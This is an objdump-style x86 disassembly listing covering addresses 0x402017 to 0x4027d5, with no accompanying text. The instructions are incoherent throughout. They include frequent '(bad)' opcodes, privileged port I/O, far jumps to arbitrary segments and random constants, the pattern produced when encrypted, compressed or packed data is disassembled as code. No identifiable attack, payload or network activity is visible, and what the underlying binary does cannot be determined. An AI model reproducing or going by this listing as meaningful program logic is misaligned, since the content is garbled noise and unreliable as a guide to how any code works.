  402017:	in     eax,0x31
  402019:	ss cwde 
  40201b:	and    BYTE PTR [esi+edx*2-0x2b],dh
  40201f:	(bad)  [ebx-0x7a]
  402022:	mov    DWORD PTR [ecx-0x1357e838],ecx
  402028:	or     cl,BYTE PTR [ebx]
  40202a:	outs   dx,DWORD PTR ds:[esi]
  40202b:	das    
  40202c:	bound  ecx,QWORD PTR [eax+ecx*8]
  40202f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402030:	dec    ebp
  402031:	cli    
  402032:	push   edx
  402033:	and    ebx,DWORD PTR [ecx+0x21]
  402036:	in     al,0xfe
  402038:	push   es
  402039:	and    al,0x15
  40203b:	cmp    eax,0x18f09b60
  402040:	jge    0x402089
  402042:	das    
  402043:	out    dx,eax
  402044:	adc    al,0x8a
  402046:	je     0x402039
  402048:	push   0xffffffc9
  40204a:	test   DWORD PTR [ecx+0x1b24b3e7],0x278b39a0
  402054:	jae    0x402026
  402056:	xchg   edi,eax
  402057:	sub    ebp,eax
  402059:	neg    edi
  40205b:	adc    BYTE PTR [eax-0x74],ah
  40205e:	in     al,dx
  40205f:	mov    ebp,0x7f6237e8
  402064:	loope  0x40205f
  402066:	stc    
  402067:	and    bl,BYTE PTR [esi]
  402069:	xchg   BYTE PTR [ecx-0x2f],dl
  40206c:	cld    
  40206d:	mov    ebx,0x7f33f248
  402072:	(bad)  
  402073:	mov    ebp,0xc97524a6
  402078:	sub    BYTE PTR [eax],ch
  40207a:	dec    ecx
  40207b:	lods   eax,DWORD PTR ds:[esi]
  40207c:	xchg   edx,eax
  40207d:	push   edx
  40207e:	shr    BYTE PTR [eax-0x28cc1bb2],cl
  402084:	lock mov bh,0x62
  402087:	xchg   ch,dh
  402089:	add    BYTE PTR [eax],cl
  40208b:	aam    0x7a
  40208d:	xor    al,0x22
  40208f:	sub    ebp,DWORD PTR [esi-0x562777af]
  402095:	cwde   
  402096:	lds    edi,FWORD PTR [eax-0x37b422f5]
  40209c:	jge    0x4020c1
  40209e:	scas   eax,DWORD PTR es:[edi]
  40209f:	retf   
  4020a0:	mov    cl,0xb5
  4020a2:	in     al,0xe4
  4020a4:	popa   
  4020a5:	jnp    0x402049
  4020a7:	std    
  4020a8:	adc    eax,0xc9bfa2ec
  4020ad:	xchg   DWORD PTR [esi+0x2142ce85],eax
  4020b3:	pop    eax
  4020b4:	je     0x40210d
  4020b6:	xchg   esp,eax
  4020b7:	dec    edx
  4020b8:	sahf   
  4020b9:	clc    
  4020ba:	lock push cs
  4020bc:	ret    0x7389
  4020bf:	(bad)  
  4020c0:	and    eax,0x76c67efb
  4020c5:	inc    edx
  4020c6:	mov    al,0x95
  4020c8:	cmp    dl,ch
  4020ca:	scas   al,BYTE PTR es:[edi]
  4020cb:	cmp    ebx,DWORD PTR [edi-0x7e]
  4020ce:	sbb    al,0x10
  4020d0:	push   ebx
  4020d1:	xchg   ebx,eax
  4020d2:	adc    cl,BYTE PTR [esi-0x14]
  4020d5:	stos   DWORD PTR es:[edi],eax
  4020d6:	jno    0x402099
  4020d8:	jno    0x402131
  4020da:	xchg   ebp,eax
  4020db:	push   ss
  4020dc:	xchg   ch,al
  4020de:	add    DWORD PTR [ebx+0x58092137],esp
  4020e4:	xchg   esi,eax
  4020e5:	adc    bh,BYTE PTR [edi-0x4f]
  4020e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020e9:	dec    edx
  4020ea:	test   DWORD PTR [edi-0x3185f19b],ebx
  4020f0:	inc    esp
  4020f1:	push   ds
  4020f2:	stc    
  4020f3:	mul    DWORD PTR [eax+0x48]
  4020f6:	mov    bh,0xdd
  4020f8:	test   BYTE PTR ds:0xd81f5ac6,0xd9
  4020ff:	pop    ebx
  402100:	outs   dx,BYTE PTR ds:[esi]
  402101:	rol    DWORD PTR [ebx-0x4e1ba853],cl
  402107:	cvtdq2ps xmm3,XMMWORD PTR [esi-0x1ee1eb51]
  40210e:	aas    
  40210f:	call   0x1480:0xf77e1d56
  402116:	sar    bl,1
  402118:	inc    edx
  402119:	jae    0x40212a
  40211b:	xor    al,0x41
  40211d:	stc    
  40211e:	stos   BYTE PTR es:[edi],al
  40211f:	out    0x8d,al
  402121:	nop
  402122:	aam    0xb5
  402124:	lock mul BYTE PTR [ebx+0x6ff9ac6]
  40212b:	and    eax,0x35519cf2
  402130:	jno    0x402110
  402132:	popa   
  402133:	dec    esi
  402134:	sbb    DWORD PTR [edi],0x1f026e32
  40213a:	pop    ecx
  40213b:	js     0x40216f
  40213d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40213e:	sub    ch,BYTE PTR [ecx]
  402140:	lods   eax,DWORD PTR ds:[esi]
  402141:	and    DWORD PTR [edx-0x4d78efa6],ecx
  402147:	sub    BYTE PTR [esp+ecx*2+0x5c],ah
  40214b:	dec    ecx
  40214c:	jb     0x402135
  40214e:	push   cs
  40214f:	lahf   
  402150:	push   eax
  402151:	sub    eax,0x58672344
  402156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402157:	push   0x44
  402159:	xor    eax,0x52d8f467
  40215e:	mov    BYTE PTR [esi-0x37],dh
  402161:	push   ebp
  402162:	jmp    0xe2b07cf8
  402167:	xor    bh,dl
  402169:	xchg   edi,eax
  40216a:	push   ebx
  40216b:	pop    ecx
  40216c:	push   0xe1087e4f
  402171:	(bad)  
  402172:	and    BYTE PTR ds:0xdf122d0,ch
  402178:	inc    ebp
  402179:	popf   
  40217a:	shl    WORD PTR [esi+0x4c],0xd9
  40217f:	data16 jp 0x4021e5
  402182:	stos   DWORD PTR es:[edi],eax
  402183:	(bad)  
  402184:	imul   esi,DWORD PTR [ebx],0xffffffa8
  402187:	push   ebx
  402188:	mov    DWORD PTR [ebp-0x3c],esi
  40218b:	jecxz  0x402163
  40218d:	fs and ch,ah
  402190:	inc    eax
  402191:	or     eax,0x6d68816c
  402196:	xor    al,0xad
  402198:	mov    ds:0x6d6d2511,eax
  40219d:	pop    edx
  40219e:	sbb    ch,ah
  4021a0:	mov    WORD PTR [eax+edx*2-0x380379ec],es
  4021a7:	mov    WORD PTR [ebx],cs
  4021a9:	sbb    bl,bh
  4021ab:	test   DWORD PTR [ebx],ebx
  4021ad:	cmc    
  4021ae:	jno    0x4021c1
  4021b0:	xor    DWORD PTR [esi+0x190b4935],esi
  4021b6:	mov    esi,0x685db028
  4021bb:	jl     0x40216a
  4021bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021be:	pushf  
  4021bf:	mov    BYTE PTR [esi-0x5f],bl
  4021c2:	xlat   BYTE PTR ds:[ebx]
  4021c3:	add    al,0xfc
  4021c5:	or     eax,0x1ec58bee
  4021ca:	aaa    
  4021cb:	jge    0x4021cb
  4021cd:	sahf   
  4021ce:	lds    edi,FWORD PTR [eax]
  4021d0:	push   es
  4021d1:	(bad)  
  4021d2:	add    eax,0x617d3e35
  4021d7:	cmp    al,0x41
  4021d9:	adc    eax,0x3c4bfd96
  4021de:	hlt    
  4021df:	add    BYTE PTR [edi+0x6fa10c6e],dh
  4021e5:	inc    esi
  4021e6:	xchg   BYTE PTR [ebp-0x66899899],ch
  4021ec:	ss mov ah,0xc4
  4021ef:	enter  0xc335,0xa7
  4021f3:	pop    ecx
  4021f4:	in     al,dx
  4021f5:	xor    BYTE PTR [esi+0x61426520],al
  4021fb:	imul   edi,ecx,0xc16c45c0
  402201:	loope  0x4021df
  402203:	pop    eax
  402204:	aas    
  402205:	jno    0x4021e5
  402207:	lds    ebx,FWORD PTR [ebp-0x5bfc567f]
  40220d:	sar    BYTE PTR [edi+0x62],cl
  402210:	mov    edx,0x471057cf
  402215:	pusha  
  402216:	and    edi,ebx
  402218:	dec    esp
  402219:	xchg   edi,eax
  40221a:	aad    0x9d
  40221c:	pop    ds
  40221d:	sbb    eax,0x26bda687
  402222:	xchg   edx,ecx
  402224:	inc    esp
  402225:	sar    BYTE PTR [ebx+0x4b],0xbb
  402229:	inc    edi
  40222a:	pop    edx
  40222b:	xrelease mov BYTE PTR [edi+0x197c339c],al
  402232:	xor    eax,esp
  402234:	leave  
  402235:	jae    0x402219
  402237:	mov    bh,0x46
  402239:	stos   BYTE PTR es:[edi],al
  40223a:	push   edi
  40223b:	popa   
  40223c:	sar    ah,1
  40223e:	int    0x9
  402240:	lock jmp 0x40221a
  402243:	xchg   esi,eax
  402244:	adc    eax,DWORD PTR [ebp+0x3d]
  402247:	mov    ah,0x94
  402249:	cmp    ecx,DWORD PTR [ebp-0x53]
  40224c:	jmp    0xc018:0x83f5b423
  402253:	out    0xf4,al
  402255:	test   al,0xa6
  402257:	shl    BYTE PTR [edi],1
  402259:	shl    dh,1
  40225b:	mov    ds,WORD PTR [ecx-0xeac507c]
  402261:	outs   dx,DWORD PTR ds:[esi]
  402262:	or     edx,eax
  402264:	enter  0x7442,0x3
  402268:	and    al,0xd3
  40226a:	jb     0x402221
  40226c:	repnz bound ecx,QWORD PTR [edx+0x18b80ac3]
  402273:	adc    ch,bh
  402275:	push   ebx
  402276:	sub    bh,0xe4
  402279:	mov    bh,BYTE PTR [ebp+0x72]
  40227c:	sbb    dh,BYTE PTR ds:0x2f60bb7d
  402282:	dec    ecx
  402283:	mov    cl,0x3b
  402285:	aad    0xa4
  402287:	jae    0x4022b8
  402289:	sbb    BYTE PTR [ebx],0xce
  40228c:	enter  0xc5ac,0x54
  402290:	sub    al,BYTE PTR [eax-0x38cdce9d]
  402296:	loopne 0x40222f
  402298:	(bad)  
  402299:	sub    al,0x77
  40229b:	sbb    BYTE PTR [edx],bh
  40229d:	pop    eax
  40229e:	scas   al,BYTE PTR es:[edi]
  40229f:	stos   BYTE PTR es:[edi],al
  4022a0:	sbb    al,0x71
  4022a2:	or     BYTE PTR [ecx-0x3d9d37fc],0xd4
  4022a9:	out    dx,al
  4022aa:	mov    eax,0x6cd9c96e
  4022af:	nop
  4022b0:	stos   BYTE PTR es:[edi],al
  4022b1:	pop    es
  4022b2:	mov    ds:0x776cbff4,eax
  4022b7:	mov    WORD PTR [ebp+0x2fe56984],ds
  4022bd:	mov    edx,0x890458f9
  4022c2:	arpl   WORD PTR [esi-0x3],si
  4022c5:	push   ds
  4022c6:	jo     0x40233c
  4022c8:	mov    edi,DWORD PTR ds:0xd496e84e
  4022ce:	hlt    
  4022cf:	outs   dx,BYTE PTR ds:[esi]
  4022d0:	mov    edx,0xa1ee01f2
  4022d5:	daa    
  4022d6:	loopne 0x4022f9
  4022d8:	(bad)  
  4022d9:	xchg   ecx,eax
  4022da:	mov    ebx,0xa0adebfe
  4022e0:	dec    esi
  4022e1:	push   ebx
  4022e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022e3:	add    DWORD PTR [esi+ebx*1-0x53],edx
  4022e7:	aad    0xe8
  4022e9:	and    BYTE PTR ds:0xa9dcaf97,bl
  4022ef:	xor    DWORD PTR [eax],0xb97ad4a5
  4022f5:	add    DWORD PTR [edx],esp
  4022f7:	gs icebp 
  4022f9:	into   
  4022fa:	mov    ss,WORD PTR [eax+0x57]
  4022fd:	shl    DWORD PTR [ebp-0x1a],cl
  402300:	push   esp
  402301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402302:	mov    eax,0xc8c60fb3
  402307:	scas   al,BYTE PTR es:[edi]
  402308:	pop    edi
  402309:	stos   BYTE PTR es:[edi],al
  40230a:	in     eax,0x68
  40230c:	fsubr  st(1),st
  40230e:	push   0xffffffe7
  402310:	xor    esp,DWORD PTR [esi-0xa]
  402313:	dec    ebp
  402314:	jns    0x4022a6
  402316:	dec    eax
  402317:	lea    edx,[eax+0x4b392a1d]
  40231d:	cmp    DWORD PTR [ebx-0x53c9c8b6],edx
  402323:	xor    ecx,DWORD PTR [ecx+edx*1-0x211f1709]
  40232a:	ins    BYTE PTR es:[edi],dx
  40232b:	leave  
  40232c:	sub    eax,0x4de3c3d6
  402331:	add    BYTE PTR [edi+0x53184e03],0xbd
  402338:	repnz sbb bh,BYTE PTR [ebx-0x5a00a8bf]
  40233f:	shr    DWORD PTR [eax+0x4baa117b],0x82
  402346:	(bad)  
  402347:	pop    edi
  402349:	mov    dl,0xe7
  40234b:	or     DWORD PTR [edx+0x39],ecx
  40234e:	test   eax,ebx
  402350:	adc    eax,0x70e94c18
  402355:	mov    bh,0xd3
  402357:	and    DWORD PTR [edx-0x36],esp
  40235a:	out    0x65,al
  40235c:	into   
  40235d:	pop    edx
  40235e:	sub    DWORD PTR [ebp+0x277f9545],ebp
  402364:	cmc    
  402365:	mov    ss,esi
  402367:	add    dl,BYTE PTR [esi+ebx*8]
  40236a:	pop    esp
  40236b:	push   0xf
  40236d:	lods   eax,DWORD PTR ds:[esi]
  40236e:	push   0x2f
  402370:	test   BYTE PTR [esi],dh
  402372:	mov    fs,WORD PTR [ebx]
  402374:	xchg   esp,eax
  402376:	mov    ah,0x38
  402378:	jl     0x4022fb
  40237a:	retf   0x7ccb
  40237d:	inc    edx
  40237e:	sbb    eax,0x167730f7
  402383:	sub    ebx,DWORD PTR ds:0x10d9a7da
  402389:	fnstcw WORD PTR [esi]
  40238b:	sub    BYTE PTR [ecx+0x16f482ff],ch
  402391:	mov    edi,0x1c36b21a
  402396:	jbe    0x40237f
  402398:	sbb    dl,ch
  40239a:	imul   DWORD PTR [esi-0x3b033253]
  4023a0:	dec    ebx
  4023a1:	add    BYTE PTR [eax+edi*4-0x4f],0x82
  4023a6:	cmp    al,0x5d
  4023a8:	add    bh,al
  4023aa:	inc    ebx
  4023ab:	and    al,0x57
  4023ad:	or     eax,0x7d62b4c8
  4023b2:	sub    DWORD PTR [ebx],edx
  4023b4:	fild   QWORD PTR [eax+0x2fcd6415]
  4023ba:	sti    
  4023bb:	paddd  mm5,QWORD PTR [esi+edx*4+0x1b]
  4023c0:	mov    ebx,0x174fdde6
  4023c5:	into   
  4023c6:	sar    BYTE PTR [eax-0x3601b8ac],cl
  4023cc:	sbb    al,0x40
  4023ce:	pop    ss
  4023cf:	(bad)  
  4023d0:	pop    edx
  4023d1:	or     eax,0xd9c7ef80
  4023d6:	pop    eax
  4023d7:	(bad)  
  4023d8:	mov    eax,ds:0xc71ce166
  4023dd:	out    dx,al
  4023de:	jmp    0x4023c9
  4023e0:	mov    dl,0x7d
  4023e2:	(bad)  
  4023e3:	or     DWORD PTR [ebp+0x1b],ecx
  4023e6:	sbb    edi,DWORD PTR [edi+0x22fda8fa]
  4023ec:	sti    
  4023ed:	into   
  4023ee:	ins    DWORD PTR es:[edi],dx
  4023ef:	hlt    
  4023f0:	adc    ebp,DWORD PTR [ecx+0x3534e4cb]
  4023f6:	or     ecx,eax
  4023f8:	adc    dl,BYTE PTR [eax+0x2e]
  4023fb:	lds    ecx,FWORD PTR [edi+0x5c3187a7]
  402401:	mov    esi,0x2828ee68
  402406:	repnz (bad) 
  402408:	sbb    edi,edi
  40240a:	dec    edx
  40240b:	mov    ch,0x75
  40240d:	mov    bl,0x1e
  40240f:	ds mov eax,0xea1c44e9
  402415:	sub    DWORD PTR [edx],eax
  402417:	sub    al,0x5
  402419:	addr16 in eax,0xfe
  40241c:	outs   dx,DWORD PTR ds:[esi]
  40241d:	xchg   esi,eax
  40241e:	sbb    al,0x0
  402420:	ins    DWORD PTR es:[edi],dx
  402421:	ins    DWORD PTR es:[edi],dx
  402422:	jp     0x4023e3
  402424:	mov    al,ds:0x765131e9
  402429:	mov    bh,0xa
  40242b:	repz mov ch,0x74
  40242e:	pop    esi
  40242f:	int3   
  402430:	fwait
  402431:	enter  0xc7f9,0xe8
  402435:	push   ecx
  402436:	jmp    FWORD PTR [edx-0x4b]
  402439:	mov    ds:0x5d21c6a5,eax
  40243e:	or     eax,0x55c63451
  402443:	js     0x402434
  402445:	add    BYTE PTR [edi],0x5d
  402448:	jnp    0x402406
  40244a:	into   
  40244b:	ins    BYTE PTR es:[edi],dx
  40244c:	cli    
  40244d:	dec    edx
  40244e:	sbb    DWORD PTR [ebp-0xb],0xffffffe5
  402452:	or     eax,DWORD PTR [edx+0x11d26cdf]
  402458:	xchg   BYTE PTR [ebx+0x7761e84f],bl
  40245e:	push   esi
  40245f:	mov    ah,0xd
  402461:	ss push esp
  402463:	pop    ecx
  402464:	jmp    0xc452b094
  402469:	in     eax,dx
  40246a:	pop    esi
  40246b:	sub    esi,DWORD PTR [edi+0x21]
  40246e:	and    edi,ecx
  402470:	out    0x4e,al
  402472:	add    BYTE PTR [ecx-0x14],al
  402475:	repnz fcmovnbe st,st(2)
  402478:	adc    al,0xff
  40247a:	(bad)  
  40247b:	jo     0x40245f
  40247d:	ss nop
  40247f:	mov    dl,0x2
  402481:	fsubr  DWORD PTR [edi+0x6a6a7261]
  402487:	ret    0x2f9f
  40248a:	xor    eax,DWORD PTR [edi]
  40248c:	ins    BYTE PTR es:[edi],dx
  40248d:	mov    ecx,0x559a0696
  402492:	iret   
  402493:	imul   edi,DWORD PTR [ecx-0x80],0xffffffd6
  402497:	sbb    eax,0x87f8c006
  40249c:	stos   BYTE PTR es:[edi],al
  40249d:	pusha  
  40249e:	inc    edx
  40249f:	mov    bl,0x60
  4024a1:	xlat   BYTE PTR ds:[ebx]
  4024a2:	sbb    DWORD PTR [esi],eax
  4024a4:	cld    
  4024a5:	test   al,cl
  4024a7:	stc    
  4024a8:	lds    ebp,FWORD PTR [ecx]
  4024aa:	(bad)  
  4024ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024ac:	pop    edx
  4024ad:	mov    WORD PTR [eax+ecx*4],?
  4024b0:	out    dx,al
  4024b1:	lock test eax,0xf4d3f867
  4024b7:	test   al,0x67
  4024b9:	add    eax,0x51ac23dd
  4024be:	push   0x73
  4024c0:	call   0xf7bf:0x83a88576
  4024c7:	sahf   
  4024c8:	div    ah
  4024ca:	xor    BYTE PTR [ebp*1+0x3aabbe2e],bh
  4024d1:	lock out dx,al
  4024d3:	mov    eax,0x4b94101e
  4024d8:	mov    al,BYTE PTR [ebx+ecx*4+0x74]
  4024dc:	mov    WORD PTR [edx],ss
  4024de:	xor    BYTE PTR [eax+0x6df95c5b],ah
  4024e4:	mov    bh,0x45
  4024e6:	lahf   
  4024e7:	fild   WORD PTR [ecx+0x538fa5e2]
  4024ed:	cmp    bl,BYTE PTR [ebx+eax*8+0x7d45abaf]
  4024f4:	sbb    al,0x3c
  4024f6:	sub    dl,BYTE PTR [eax]
  4024f8:	xchg   esi,eax
  4024f9:	iret   
  4024fa:	cmp    eax,0xc2cb7b7e
  4024ff:	jmp    0x2b7c:0x3902e9cc
  402506:	lahf   
  402507:	ror    cl,1
  402509:	ss jnp 0x4024fa
  40250c:	es ret 0xc32c
  402510:	pop    esp
  402511:	dec    edi
  402512:	inc    ecx
  402513:	std    
  402514:	stos   BYTE PTR es:[edi],al
  402515:	add    DWORD PTR [ebp-0x32],ebp
  402518:	icebp  
  402519:	dec    edi
  40251a:	fstp   QWORD PTR [edi]
  40251c:	sbb    dl,0x56
  40251f:	sbb    DWORD PTR ds:[edi],ecx
  402522:	dec    edx
  402523:	or     ebp,DWORD PTR [edi-0x30528ebc]
  402529:	pop    ss
  40252a:	pushf  
  40252b:	fs cmp dh,dh
  40252e:	mov    ah,BYTE PTR [eax]
  402530:	jbe    0x4025af
  402532:	jl     0x402593
  402534:	out    dx,eax
  402535:	test   DWORD PTR [esi],eax
  402537:	pop    esi
  402538:	sub    al,0xd9
  40253a:	mov    dh,0x95
  40253c:	sbb    al,0x72
  40253e:	push   ds
  40253f:	or     BYTE PTR [esi-0xf],bh
  402542:	pop    ss
  402543:	fisttp QWORD PTR [edi]
  402545:	sub    al,0xca
  402547:	shl    ebp,0xf8
  40254a:	sub    cl,BYTE PTR [eax]
  40254c:	cmp    cl,cl
  40254e:	add    DWORD PTR [edx-0x10],edi
  402551:	daa    
  402552:	mov    eax,0xc385b852
  402557:	dec    eax
  402558:	push   0xffffffce
  40255a:	mov    al,0x9a
  40255c:	inc    ebx
  40255d:	ret    0xada4
  402560:	xchg   DWORD PTR [ebx],ebp
  402562:	in     al,dx
  402563:	sub    ch,BYTE PTR [eax-0x759db23d]
  402569:	xchg   DWORD PTR [edi+esi*4],edx
  40256c:	mov    ch,0xc7
  40256e:	lods   eax,DWORD PTR ds:[esi]
  40256f:	cmp    eax,0xa0230f1a
  402574:	push   ss
  402575:	lahf   
  402576:	or     DWORD PTR [eax+0x2c],0xf1efedeb
  40257d:	inc    edx
  40257e:	sub    eax,0x47193cbb
  402583:	xchg   ecx,eax
  402584:	add    esp,DWORD PTR [esi-0x41]
  402587:	lods   al,BYTE PTR ds:[esi]
  402588:	xor    ebp,ebx
  40258a:	pop    esp
  40258b:	and    BYTE PTR [eax],al
  40258d:	sahf   
  40258e:	bound  ebp,QWORD PTR [ebx+0x1d]
  402591:	jecxz  0x4025f1
  402593:	stc    
  402594:	xchg   esi,eax
  402595:	dec    edx
  402596:	and    DWORD PTR [eax],esi
  402598:	mov    esp,0xe08b8fe1
  40259d:	scas   eax,DWORD PTR es:[edi]
  40259e:	adc    al,0x71
  4025a0:	icebp  
  4025a1:	aad    0xa9
  4025a3:	inc    ebp
  4025a4:	inc    ebp
  4025a5:	adc    al,0xd4
  4025a7:	or     bh,BYTE PTR [eax-0x7e36a291]
  4025ad:	into   
  4025ae:	jl     0x402591
  4025b0:	mov    esp,0x694a77b7
  4025b5:	xchg   ebx,eax
  4025b6:	pop    es
  4025b7:	(bad)  
  4025b8:	or     esi,DWORD PTR [esi-0x6110b93e]
  4025be:	jo     0x402548
  4025c0:	mov    DWORD PTR [ebx],eax
  4025c2:	loop   0x4025e4
  4025c4:	dec    esp
  4025c5:	adc    DWORD PTR [edx-0x6766534e],esi
  4025cb:	push   esi
  4025cc:	std    
  4025cd:	popf   
  4025ce:	sahf   
  4025cf:	mov    dh,0xcf
  4025d1:	outs   dx,BYTE PTR ds:[esi]
  4025d2:	pop    esi
  4025d3:	mov    BYTE PTR [ebx],bh
  4025d5:	or     al,0x1d
  4025d7:	and    BYTE PTR [ebx+eiz*8+0x3d74eb0e],cl
  4025de:	xchg   ecx,eax
  4025df:	mov    DWORD PTR [ecx],ecx
  4025e1:	shl    DWORD PTR [edi],1
  4025e3:	jg     0x4025ec
  4025e5:	inc    edi
  4025e6:	(bad)  
  4025e7:	mov    esi,0xe66b144d
  4025ec:	xchg   BYTE PTR [ebp-0x19],al
  4025ef:	ins    DWORD PTR es:[edi],dx
  4025f0:	mov    bh,0x68
  4025f2:	stos   DWORD PTR es:[edi],eax
  4025f3:	into   
  4025f4:	fldenv ds:[edx-0x4e2832c3]
  4025fb:	add    bl,BYTE PTR [edi-0x14]
  4025fe:	xor    edx,DWORD PTR [edi]
  402600:	mov    eax,0xf76b6df2
  402605:	inc    ecx
  402606:	pop    ebx
  402607:	sahf   
  402608:	imul   DWORD PTR [esi+0x28]
  40260b:	pop    ebx
  40260c:	jns    0x40261c
  40260e:	dec    ebx
  40260f:	test   eax,0x77cabfbe
  402614:	ror    DWORD PTR [edx],0xd
  402617:	xor    ebx,DWORD PTR [eax+0x40]
  40261a:	in     al,dx
  40261b:	xchg   ebx,eax
  40261c:	test   DWORD PTR [eax-0x6d],eax
  40261f:	fimul  WORD PTR [ebx+0x47]
  402622:	ret    
  402623:	rol    BYTE PTR [esi-0x78],cl
  402626:	inc    edi
  402627:	hlt    
  402628:	loopne 0x4025e1
  40262a:	retf   
  40262b:	ins    BYTE PTR es:[edi],dx
  40262c:	sahf   
  40262d:	aam    0x2
  40262f:	dec    edi
  402630:	in     eax,dx
  402631:	jge    0x40267a
  402633:	dec    ebx
  402634:	(bad)  
  402636:	les    edx,FWORD PTR [ebp+0x230ae0d8]
  40263c:	xchg   ebx,eax
  40263d:	jg     0x4026bb
  40263f:	jmp    0x40268d
  402641:	adc    BYTE PTR [edx-0x6f],cl
  402644:	into   
  402645:	repnz or BYTE PTR [edi-0x2],dl
  402649:	addr16 inc ebx
  40264b:	mov    cl,0x1e
  40264d:	je     0x402689
  40264f:	sbb    bl,BYTE PTR [ebx]
  402651:	cmp    esi,DWORD PTR [ebx-0x765ad1c]
  402657:	mov    ebx,0x49e4b19
  40265c:	mov    ah,0xdc
  40265e:	es pop ebp
  402660:	push   cs
  402661:	push   ebx
  402662:	and    ah,BYTE PTR [ebx+0x46]
  402665:	xor    al,cl
  402667:	mov    DWORD PTR [edx+0x3e3a8e96],ebp
  40266d:	jge    0x4026e6
  40266f:	les    ebx,FWORD PTR [eax+edx*4]
  402672:	nop
  402673:	(bad)  
  402674:	leave  
  402675:	ror    eax,1
  402677:	int    0xdc
  402679:	fs mov dl,0xec
  40267c:	ja     0x40264f
  40267e:	js     0x40269d
  402680:	dec    edx
  402681:	add    DWORD PTR [ecx-0x39],0x70e4fd92
  402688:	xchg   esi,eax
  402689:	or     ecx,0xffffff96
  40268c:	dec    ebx
  40268d:	call   0xca6314ee
  402692:	xchg   esi,eax
  402693:	sbb    cl,bl
  402695:	pop    ss
  402696:	repz sbb eax,0x4281a0d
  40269c:	ja     0x4026d7
  40269e:	cmp    eax,DWORD PTR [ebx+0x6d]
  4026a1:	mov    eax,ds:0xd8e26474
  4026a6:	jne    0x40264e
  4026a8:	and    eax,0x42a26f88
  4026ad:	jge    0x4026b6
  4026af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026b0:	leave  
  4026b1:	push   ds
  4026b2:	sahf   
  4026b3:	mov    ebp,DWORD PTR [edi-0x26f3f6ae]
  4026b9:	fnstsw WORD PTR [edx+0x4f]
  4026bc:	outs   dx,BYTE PTR ds:[esi]
  4026bd:	ret    0x30bc
  4026c0:	jae    0x40273d
  4026c2:	outs   dx,DWORD PTR ds:[esi]
  4026c3:	pop    edi
  4026c4:	xchg   DWORD PTR [edi],ebx
  4026c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026c7:	test   eax,0x962b25e6
  4026cc:	dec    edx
  4026cd:	ss pop edx
  4026cf:	int    0x2
  4026d1:	in     eax,0x22
  4026d3:	(bad)  
  4026d4:	ficomp WORD PTR [esi+0x4d1b028b]
  4026da:	and    BYTE PTR [ebp+0x43],0x8f
  4026de:	leave  
  4026df:	or     BYTE PTR [ebx+edx*8+0x74b23bb1],al
  4026e6:	dec    esi
  4026e7:	mov    esp,0x39fca0ef
  4026ec:	sbb    ecx,DWORD PTR [esi-0x1]
  4026ef:	call   0x50de7e65
  4026f4:	retf   
  4026f5:	bound  ebp,QWORD PTR [edi-0x7f]
  4026f8:	shl    BYTE PTR [edx],cl
  4026fa:	dec    ecx
  4026fb:	mov    al,ds:0xa63d6f25
  402700:	mov    ds,WORD PTR [edi]
  402702:	jge    0x402771
  402704:	into   
  402705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402706:	mov    ds:0x9d49aed4,al
  40270b:	inc    esp
  40270c:	mov    ebp,0xec179427
  402711:	sbb    BYTE PTR [esi-0x1b],dl
  402714:	jbe    0x40276e
  402716:	popa   
  402717:	xchg   ebp,ebx
  402719:	gs add eax,0xc5c621fc
  40271f:	fst    st(3)
  402721:	aaa    
  402722:	in     al,0xa8
  402724:	sub    eax,0xd8ec49df
  402729:	sub    DWORD PTR [ecx+ecx*2],ebp
  40272c:	mov    esi,0x4f93fb6c
  402731:	pop    ebp
  402732:	call   0x39:0x85d32e50
  402739:	fs mov esp,0x9e3a6354
  40273f:	je     0x4026df
  402741:	test   DWORD PTR [eax],0x7e3e7861
  402747:	adc    eax,0x920e35ef
  40274c:	in     eax,0xab
  40274e:	xchg   esp,eax
  40274f:	jmp    0xfdfa:0x7ca53502
  402756:	push   ebp
  402757:	daa    
  402758:	into   
  402759:	in     al,dx
  40275a:	js     0x4027db
  40275c:	and    DWORD PTR [eax],edi
  40275e:	mov    edi,0xe953022b
  402763:	in     al,0x76
  402765:	fnstsw WORD PTR [eax]
  402767:	test   DWORD PTR [edx-0xb],edx
  40276a:	dec    eax
  40276b:	mov    edi,0x8ad90721
  402770:	or     eax,0xa8e21b1a
  402775:	stos   BYTE PTR es:[edi],al
  402776:	popa   
  402777:	shr    cl,cl
  402779:	loopne 0x402700
  40277b:	outs   dx,DWORD PTR ds:[esi]
  40277c:	jge    0x402739
  40277e:	data16 add dl,0x9c
  402782:	mov    bh,0x65
  402784:	jecxz  0x402757
  402786:	inc    ebx
  402787:	sbb    dl,cl
  402789:	ins    BYTE PTR es:[edi],dx
  40278a:	inc    ebx
  40278b:	dec    ebp
  40278c:	arpl   WORD PTR [edx+0x31],bx
  40278f:	pop    edx
  402790:	ins    BYTE PTR es:[edi],dx
  402791:	loope  0x4027fe
  402793:	push   0xfffffff8
  402795:	jl     0x40272d
  402797:	mov    al,0xef
  402799:	push   cs
  40279a:	pop    edi
  40279b:	fcomp  QWORD PTR [ebx+0x66]
  40279e:	dec    edx
  40279f:	xlat   BYTE PTR ds:[ebx]
  4027a0:	aam    0x1b
  4027a2:	retf   0x2034
  4027a5:	and    al,0x82
  4027a7:	rcr    esp,1
  4027a9:	mov    gs,WORD PTR [ebx]
  4027ab:	add    al,BYTE PTR [esi+0x103cd111]
  4027b1:	pop    edx
  4027b2:	and    al,BYTE PTR [ecx]
  4027b4:	shl    BYTE PTR [ecx+0x748b93f0],0x53
  4027bb:	stos   DWORD PTR es:[edi],eax
  4027bc:	push   cs
  4027bd:	test   BYTE PTR [ecx+edx*4],0x94
  4027c1:	mov    ah,0x67
  4027c3:	das    
  4027c4:	call   0xf175:0x4121250c
  4027cb:	push   ds
  4027cc:	jnp    0x4027b2
  4027ce:	call   0xc812af4
  4027d3:	push   ecx
  4027d4:	hlt    
  4027d5:	shl    DWORD PTR [eax-0x39937176],1
